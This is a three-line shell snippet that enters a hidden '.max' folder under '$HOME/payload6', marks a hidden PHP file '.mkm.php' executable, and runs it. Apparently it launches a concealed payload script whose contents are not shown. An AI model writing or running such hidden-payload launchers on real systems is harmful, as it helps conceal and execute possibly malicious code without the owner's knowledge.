cd $HOME/payload6/.max
chmod +x .mkm.php
php .mkm.php
